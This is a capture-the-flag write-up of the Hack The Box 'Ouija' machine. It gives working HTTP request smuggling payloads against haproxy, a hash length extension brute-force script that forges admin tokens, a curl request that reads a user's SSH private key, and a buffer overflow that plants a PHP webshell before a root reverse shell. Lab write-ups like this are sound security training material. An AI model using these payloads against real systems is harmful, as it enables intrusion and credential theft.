# HTB - Ouija

### TL;DR
This is an insane Ubuntu 22.04.3 machine running a web server behind a balancing haproxy v2.2.16. This is vulnerable to HTTP request smuggling, which can be abused to reach a subdomain and dump the code of another .js application running on port 3000. Analyzing this code we deduce how a superuser is formed and using this information we launch a hash extension attack, which will allow us to forge a superuser token. Using this token we can query the API endpoint to dump the private key of the low-privileged user. For escalation, we find a parameter accepting user input is vulnerable to buffer overflow. This can be exploited to generate a malicious PHP file in the host, which is fact acts as a webshell run by root.

**Keywords:**<br>
HTTP request smuggling, SHA-256, hash_extender, API token

**References:**<br>
https://www.haproxy.com/blog/february-2023-header-parser-fixed<br>
https://www.cvedetails.com/cve/CVE-2023-25725/<br>
https://medium.com/nerd-for-tech/http-request-smuggling-part-1-concepts-b89bfe17b210<br>
https://medium.com/nerd-for-tech/http-request-smuggling-part-2-tl-ce-exploit-ec1171a88459<br>
https://www.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks<br>
https://github.com/iagox86/hash_extender<br>

### PHASE 1. Service enumeration
Launch a port scan with `nmap`
```markdown
> nmap $target -p- -T4 -Pn --open --reason

Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-02 15:09 EST
Nmap scan report for 10.129.175.250
Host is up, received user-set (0.075s latency).
Not shown: 63470 closed tcp ports (conn-refused), 2062 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
3000/tcp open  ppp     syn-ack

Nmap done: 1 IP address (1 host up) scanned in 28.87 seconds
```
Enumerate the open ports.
```markdown
> nmap $target -p22,80,3000 -sV -sC -Pn -vv

Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-02 15:11 EST
Nmap scan report for 10.129.175.250
Host is up, received user-set (0.097s latency).
Scanned at 2023-12-02 15:11:02 EST for 15s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 6ff2b4ed1a918d6ec9105171d57c49bb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOF5zQd8OgxRSgutBifLJRc7jgEi2e7uNFtuctcdQmJGWQYTQ+PZQcwv5fZnF0BHotgSA8Vp58ftuLK93zuh7I8=
|   256 dfddbcdc570d98af0f882f73334862e8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICKPk/B9wRV28rwbwQHh9JYErJC2f/143AtDpUhHgTro
80/tcp   open  http    syn-ack Apache httpd 2.4.52
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    syn-ack Node.js Express framework
|_http-favicon: Unknown favicon MD5: 03684398EBF8D6CD258D44962AE50D1D
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 14.79 seconds
```
Continue fuzzing for subdomains.
```markdown
> ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --fs 10671 -t 100 -u http://ouija.htb -H "Host: FUZZ.ouija.htb"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://ouija.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.ouija.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 10671
________________________________________________

dev2                    [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 139ms]
dev                     [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 456ms]
devel                   [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 80ms]
development             [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 103ms]
dev1                    [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 85ms]
develop                 [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 80ms]
dev3                    [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 124ms]
developer               [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 114ms]
dev01                   [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 102ms]
dev4                    [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 92ms]
developers              [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 100ms]
dev5                    [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 90ms]
devtest                 [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 91ms]
dev-www                 [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 87ms]
devil                   [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 82ms]
dev.m                   [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 412ms]
:: Progress: [4989/4989] :: Job [1/1] :: 622 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
```
There is a web server running on port 80, and a subdomain running on http://dev.ouija.htb

![ouija1](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/ed494b82-e786-4cd7-9ed3-391ca70b0505)

Inspecting the source code in Firefox, we find another subdomain on http://gitea.ouija.htb

![ouija2](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/d4324a65-52cb-49c5-9da8-1f334c06951a)

Browse the gitea server, register a new account and log in. List the instructions on how the ouija server has been set up. It uses an haproxy version 2.2.16.

![ouija3](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/8da9fb15-017c-4520-9095-c2644fb22bd4)

Finally, enumerate the API running on http://gitea.ouija.htb/api/swagger<br>
Most of the endpoints require an authentication token but the endpoint `/users/search` dumps the username `leila` without authentication.

![ouija4](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/5f8ddfee-2e85-48a2-857d-8810a0178a77)

Take note of this username and move forward.

### PHASE 2: User
Looking for `haproxy 2.2.16` vulnerabilitites, we find out it is vulnerable to HTTP request smuggling <br>
https://www.haproxy.com/blog/february-2023-header-parser-fixed<br>
https://www.cvedetails.com/cve/CVE-2023-25725/<br>
<br>
There are good articles to investigate what HTTP request smuggling is.<br>
https://medium.com/nerd-for-tech/http-request-smuggling-part-1-concepts-b89bfe17b210<br>
https://medium.com/nerd-for-tech/http-request-smuggling-part-2-tl-ce-exploit-ec1171a88459<br>
<br>
The `haproxy` runs in the `ouija.htb` server for traffic balancing purposes. We can abuse the HTTP CE.TE smuggling vulnerability to reach the `dev.ouija.htb` subdomain.
Payloads can be smuggled with burpsuite, just deactivate the automatic update of the content length.

![ouija5](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/111e9d48-de54-4aa1-b5ea-eb7c0e37eb11)

The following payload allows reaching the `dev.ouija.htb` subdomain using HTTP smuggling.
```markdown
POST /index.html HTTP/1.1
Host: ouija.htb
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 40

GET http://dev.ouija.htb HTTP/1.1
x:Get / HTTP/1.1
Host: ouija.htb
```
In the response we find 2 interesting files:<br>
http://dev.ouija.htb/editor.php?file=app.js<br>
http://dev.ouija.htb/editor.php?file=init.sh<br>

![ouija6](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/42eb38e3-2789-4c80-b094-d618ab2ce845)

Using the HTTP request smuggling we dump the contents of both files.
Firstly, dump the contents of the `init.sh` file. We use the same payload, just update the `content-length` to match the size of the request.
```markdown
POST /index.html HTTP/1.1
Host: ouija.htb
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 63

GET http://dev.ouija.htb/editor.php?file/app.js HTTP/1.1
x:Get / HTTP/1.1
Host: ouija.htb
```

![ouija7](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/f39b1033-e0fc-43ee-9f3f-daec56e660b1)

The file `init.sh` contains a hash and a username.
```markdown
#!/bin/bash

echo "$(date) api config starts" >>
mkdir -p .config/bin .config/local .config/share /var/log/zapi
export k=$(cat /opt/auth/api.key)
export botauth_id="bot1:bot"
export hash="4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1"
ln -s /proc .config/bin/process_informations
echo "$(date) api config done" >> /var/log/zapi/api.log

exit 1
```
This is not useful for the moment, so we take note and dump the other `app.js` file. The payload is the same, just remember to update the `content-length` accordingly in the request.
```markdown
POST /index.html HTTP/1.1
Host: ouija.htb
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 63

GET http://dev.ouija.htb/editor.php?file/app.js HTTP/1.1
x:Get / HTTP/1.1
Host: ouija.htb
```

![ouija8](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/eb72adfb-662d-4ce2-bb76-c768c5dff680)

This file contains the source code of an application running on port 3000. 
```markdown
var express = require('express');
var app = express();
var crt = require('crypto');
var b85 = require('base85');
var fs = require('fs');
const key = process.env.k;

app.listen(3000, ()=>{ console.log("listening @ 3000"); });

function d(b){
    s1=(Buffer.from(b, 'base64')).toString('utf-8');
    s2=(Buffer.from(s1.toLowerCase(), 'hex'));
    return s2;
}
function generate_cookies(identification){
    var sha256=crt.createHash('sha256');
    wrap = sha256.update(key);
    wrap = sha256.update(identification);
    hash=sha256.digest('hex');
    return(hash);
}
function verify_cookies(identification, rhash){
    if( ((generate_cookies(d(identification)))) === rhash){
        return 0;
    }else{return 1;}
}
function ensure_auth(q, r) {
    if(!q.headers['ihash']) {
        r.json("ihash header is missing");
    }
    else if (!q.headers['identification']) {
        r.json("identification header is missing");
    }

    if(verify_cookies(q.headers['identification'], q.headers['ihash']) != 0) {
        r.json("Invalid Token");
    }
    else if (!(d(q.headers['identification']).includes("::admin:True"))) {
        r.json("Insufficient Privileges");
    }
}

app.get("/login", (q,r,n) => {
    if(!q.query.uname || !q.query.upass){
        r.json({"message":"uname and upass are required"});
    }else{
        if(!q.query.uname || !q.query.upass){
            r.json({"message":"uname && upass are required"});
        }else{
            r.json({"message":"disabled (under dev)"});
        }
    }
});
app.get("/register", (q,r,n) => {r.json({"message":"__disabled__"});});
app.get("/users", (q,r,n) => {
    ensure_auth(q, r);
    r.json({"message":"Database unavailable"});
});
app.get("/file/get",(q,r,n) => {
    ensure_auth(q, r);
    if(!q.query.file){
        r.json({"message":"?file= i required"});
    }else{
        let file = q.query.file;
        if(file.startsWith("/") || file.includes('..') || file.includes("../")){
            r.json({"message":"Action not allowed"});
        }else{
            fs.readFile(file, 'utf8', (e,d)=>{
                if(e) {
                    r.json({"message":e});
                }else{
                    r.json({"message":d});
                }
            });
        }
    }
});
app.get("/file/upload", (q,r,n) =>{r.json({"message":"Disabled for security reasons"});});
app.get("/*", (q,r,n) => {r.json("200 not found , redirect to .");});
```
The app running on port 3000 runs several APIs, we just need to focus on `/get/file` and `/users`. These endpoints use token authentication which is enforced in function `ensure_auth`. An user authenticates sending 2 headers: `ihash` and `identification`<br>
The identification header is formed taking an username and appending certain string, then it is base64-encoded. Finally, a sha-256 hash is calculated on the resulting string using a secret key stored in env variable `k`, but we do not know this key or its length.<br>
The `ihash` header is a signature hash which will be compared to the resulting identification to verify user's identity.<br>
If we remember the `init.sh` file, we already know the value of the prepended data and the hash, so we we can launch a `hash_extender` attack (https://www.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks).<br>
Install the `hash_extender` tool from github https://github.com/iagox86/hash_extender<br>
```markdown
> git clone https://github.com/iagox86/hash_extender
> cd hash_extender
> make
```
Several deprecated warnings prevent make the application, but this can be solved editing the Makefile and adding `-Wno-deprecated-declarations` in the CFLAGS line.
```markwdown
> vim Makefile
CFLAGS          := -std=c89 -g -oS -Wall -Werror -Wno-deprecated-declarations
```
We do not know the size of the secret, so we will have to brute force it. First step is to generate a file called `strings` containing hashes from size 1 to 47. We use the username `bot1:bo` from the `init.sh` file, and the append string is `::admin:True`. The signature hash is taken also from the `init.sh` file. Finally, the results are base64 encoded and written to the `strings` file.
```markdown
> for i in $(seq 1 47); do ./hash_extender --data bot1:bot --append '::admin:True' -f sha256 -s 4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1 -l $i | grep 'New string' | awk -F': ' '{print $2}' | base64 -w 500 >> strings;done
> wc -l strings
47 strings
```
We also need the `New signature`, we grab it launching a `hash_extender` with whatever length, (e.g. 20)
```markdown
> ./hash_extender --data bot1:bot --append '::admin:True' -f sha256 -s 4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1 -l 20

Type: sha256
Secret length: 20
New signature: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b
New string: 626f74313a626f748000000000000000000000000000000000000000000000000000000000000000000000e03a3a61646d696e3a54727565
```

![ouija9](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/40545b07-9a68-480c-83df-d046fc111c4c)

At this point we have the `New signature` field `14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b`, and the `strings` file containing the `New string` from size 1 to 47. We are ready to bruteforce the application. For this, a small bash script is proposed.
```markdown
#!/bin/bash

rm results
touch results

echo "[+] Running stuff..."
for i in $(cat strings)
do
        echo $i >> results
        curl -s ouija.htb:3000/users -H "ihash: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b" -H "identification: $i" >> results
done

token=$(grep "Database" results | cut -d '}' -f2)

echo "[+] Token found: "
echo $token
echo "[+] Length of token: "
echo $token | wc -c
```
Running it we find the authentication token, and its length (note this is not the same as the secret length).

![ouija10](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/77d001a8-98d3-416b-9cd5-af6c40c4bd8e)

Finally, query the `/file/get` API on port 3000 with this token, and browse files in the application file system running on `/proc/self/root` to dump leila's private key, which can be used to login into the host and get the user flag.
```markdown
> curl -X 'GET' \
'http://ouija.htb:3000/file/get?file=.config/bin/process_informations/self/root/home/leila/.ssh/id_rsa' \
-H 'ihash: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b' \
-H 'identification: NjI2Zjc0MzEzYTYyNmY3NDgwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDBmODNhM2E2MTY0NmQ2OTZlM2E1NDcyNzU2NQo='
```

![ouija11](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/44812e01-37ab-41fa-b4ea-d3b3d27e1786)

This shell allows to retrieve the user flag.

### PHASE 3: Root
Begin from an SSH session for user `leila`
```markdown
> ssh -i ./id_rsa leila@ouija.htb
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Feb  9 11:00:38 AM UTC 2024

  System load:                      0.10595703125
  Usage of /:                       89.7% of 5.07GB
  Memory usage:                     44%
  Swap usage:                       0%
  Processes:                        411
  Users logged in:                  0
  IPv4 address for br-f9142471f070: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.244
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:9b61

  => / is using 89.7% of 5.07GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Feb  9 10:50:56 2024 from 10.10.14.124
leila@ouija:~$
```
Take the opportunity to enumerate the system.
```markdown
> uname -a && cat /etc/os-release
Linux ouija 5.15.0-89-generic #99-Ubuntu SMP Mon Oct 30 20:42:41 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```
And the user `leila`
```markdown
> whoami && id
leila
uid=1000(leila) gid=1000(leila) groups=1000(leila)
```
List internal running services.
```markdown
> netstat -lnput
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:9999          0.0.0.0:*               LISTEN      2118/ssh            
tcp6       0      0 ::1:9999                :::*                    LISTEN      2118/ssh            
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      1837/java           
tcp6       0      0 127.0.0.1:36569         :::*                    LISTEN      1837/java           
udp        0      0 0.0.0.0:44295           0.0.0.0:*                           - 
```
It seems there is an internal server running on port 9999. Restart the SSH session but this time forwarding the port 9999 to Kali.
```mardkwon
> ssh -i ./id_rsa -L 9999:127.0.0.1:9999 leila@ouija.htb
```
Now the service running on 9999 can be locally browsed in Kali with firefox.

![Untitled00](https://github.com/g1vi/AllTheWriteUps/assets/120142960/5b0dc90d-62e4-4e19-927b-34b0f002dbeb)

The source code of this site is located in the path `/development/server-management_system_id_0/index.php`. Copy the file to Kali for inspection.
```markdown
> scp -i ./id_rsa leila@ouija.htb:/development/server-management_system_id_0/index.php .
index.php                   100% 3084    24.4KB/s   00:00
```
The source code contains a call to a function `say_lverifier()` which checks username and password client inputs.

![Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/0c519ef3-4ca5-4ae3-a3b3-3190ff6e2330)

The library is located in the path `/usr/lib/php/20220829/lverifier.so`. Download the file in Kali for inspection.
```markdown
> scp -i ./id_rsa leila@ouija.htb:/usr/lib/php/20220829/lverifier.so . 
lverifier.so                100%   42KB 154.9KB/s   00:00    
```
Decompile the file `lverifier.so` with `ghidra` and inspect the `say_lverifier()` function, this calls another function `validating_userinput()` for client input sanitization.

![Untitled2](https://github.com/g1vi/AllTheWriteUps/assets/120142960/ff8852a4-b523-45ae-8067-0f7290d28869)

Navigate to the function `validating_userinput()`. Decompiling was done with `ida` and generating pseudocode (F5).

![Untitled3](https://github.com/g1vi/AllTheWriteUps/assets/120142960/9d5da11b-0f3f-41ee-bcaa-8dfd71496772)

This part is vulnerable to buffer overflow. The `username` input is stored in a buffer `nu` with an allocated size of 800; however, the user input is not limited. On the other hand, `size_t` buffer type is used to save the size of `username`, which maximum value is 65535 bytes.<br>
<br>
Finally, inspect the function `event_recorder`. This is used to write the log after the user input validation finishes.

![Untitled4](https://github.com/g1vi/AllTheWriteUps/assets/120142960/9f33e94a-08b4-46f9-aa52-44d8ed53b474)

To fuzz the buffer overflow we need to set up a test rig running PHP and `gdb` (C/C++ debugger).<br>
<br>
The rig machine will be an Ubuntu 22.04.2 host with PHP 8.2. First, install PHP.
```markdown
> add-apt-repository ppa:ondrej/php

> apt update && apt install -y php8.2 php8.2-cli php8.2-{bz2,curl,mbstring,intl}

> apt install -y php8.2-fpm

> a2enconf php8.2-fpm
Enabling conf php8.2-fpm.
To activate the new configuration, you need to run:
 systemctl reload apache2
 
> systemctl reload apache2
```
Verify PHP installation.
```markdown
> php –v
PHP 8.2.15 (cli) (built: Jan 20 2024 14:17:05) (NTS)
Copyright (c) The PHP Group
Zend Engine v4.2.15, Copyright (c) Zend Technologies
with Zend OPcache v8.2.15, Copyright (c), by Zend Technologies
```
Verify `gdb` is installed (that's the case by default in Ubuntu), then install `gef` (gdb enhancer features https://github.com/hugsy/gef).
```markdown
> gdb –v
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later http://gnu.org/licenses/gpl.html
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

> bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```
Once PHP is installed and running, we will load the `lverifier.so` file.
```markdown
> cp /mnt/lverifier.so /usr/lib/php/20220829

> chmod +x /usr/lib/php/20220829/lverifier.so
```
Finally, modify the `php.ini` and `lverifier.ini` files.
```markdown
> echo "extension=lverifier.so" > /etc/php/8.2/cli/conf.d/50-lverifier.ini

> sed -i 's/enable_dl = Off/enable_dl = On/g' /etc/php/8.2/cli/php.ini
```
Run PHP under the `gdb` environment to debug the application.
```markdown
> gdb php
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.10
Reading symbols from php...
(No debugging symbols found in php)

> gef➤  run -a
Starting program: /usr/bin/php -a
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Interactive shell
```

![Untitled5](https://github.com/g1vi/AllTheWriteUps/assets/120142960/92e355d4-a7e5-4e79-aa1b-24a3b1f97a26)

Make the application crash by sending a large input in the `username` parameter.
```markdown
php > $username = str_repeat('A', 4096000);
php > $x = say_lverifier($username, 'password');
```

![Untitled6](https://github.com/g1vi/AllTheWriteUps/assets/120142960/23be2d7a-3625-40fe-af69-000e524e50f0)

The application crashes and dumps the register content.

![Untitled7](https://github.com/g1vi/AllTheWriteUps/assets/120142960/b7d2389a-171c-41e2-9af6-93e1c814feca)

Before restarting it, add a breakpoint in the `event_recorder` function, this will be useful in the next step.
```markdown
b event_recorder
```

![Untitle8](https://github.com/g1vi/AllTheWriteUps/assets/120142960/c72a23b4-1e9e-4709-a921-dcd8c991e1fa)

In order to control the registers, we need to know the offset of the payloads. For this, create a pattern size 65535 with `pwntools` or `msf-pattern_create`, then feed it to the application and let it crash.<br>
<br>
Inspect the content of the `p` and `w` parameters of the `event_recorder` function.

![Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/3e81575a-4da1-4038-9ff5-a9d3db023fa4)

And find their position in the pattern.

![Untitle9](https://github.com/g1vi/AllTheWriteUps/assets/120142960/04f01471-9031-4c39-a778-4c4079ef5c08)

So we have found that when we feed a large input in the `username` parameter, it overflows and overwrites parameters `p` (position 16 of the input payload) and `w` (position 128 of the input payload) in the `event_recorder` function. Also, we know the user input for `username`is assigned to a buffer size 800.<br> 
<br>
Abusing the buffer overflow we can manipulate the `event_recorder` function parameters, and therefore control the output log path and its content. In fact, manipulating the last part of the log path we can also manipulate the log content.<br>
<br>
To get a root shell we will create a directory in the victim machine whose name is PHP code. Then we will use the overflow to write the PHP file to the web directory, so it can be exploited from a web browser. At the end, the final written log will also contain our directory name, which is the PHP code.<br>
<br>
First, create a directory in `leila` SSH shell. The directory name itself is actually PHP code.
```markdown
> mkdir "/var/tmp/<?=\`\$_GET[0]\`?>"
```
To generate the payload, we will use a Python interpreter.
```markdown
>>> a = '/var/tmp/<?=`$_GET[0]`?>/../../..//development/server-management_system_id_0/index.php'
>>> len(a)
86
>>> '/'*714 + a + 'A'*64738
'///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////var/tmp/<?=`$_GET[0]`?>/../../..//development/server-management_system_id_0/index.phpAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA….
```

![Untitle10](https://github.com/g1vi/AllTheWriteUps/assets/120142960/afaf3575-1293-443b-92be-c9a00ee78839)

Back in Kali, capture a login attempt in http://localhost:9999 and use repeater to insert the payload in the `username` parameter.

![Untitled11](https://github.com/g1vi/AllTheWriteUps/assets/120142960/88fd7e73-ae57-4a76-8d39-7e7c83f60eaa)

Send the payload and verify an `index.php` file containing the malicious PHP code has been created in the victim machine in the path `/development/server-management_system_id_0/index.php`

![Untitled12](https://github.com/g1vi/AllTheWriteUps/assets/120142960/3973763b-f55a-4146-adce-44846c308f6b)

Now we can send a reverse shell using the `index.php` file. Let's verify first in a browser we have RCE (i.e. a webshell).

![Untitled13](https://github.com/g1vi/AllTheWriteUps/assets/120142960/c1850e48-c879-43bf-8222-1235521b08e9)

To have a root shell prepare an `nc mkfifo` shell and send with Burpsuite.

![Untitled14](https://github.com/g1vi/AllTheWriteUps/assets/120142960/642c800f-3d18-4916-a8b0-be96f259f154)

A reverse shell is received on port 1919.

![Untitled15](https://github.com/g1vi/AllTheWriteUps/assets/120142960/14720174-a3ab-4f33-ae2b-7f08f3dd27f2)

You are root.
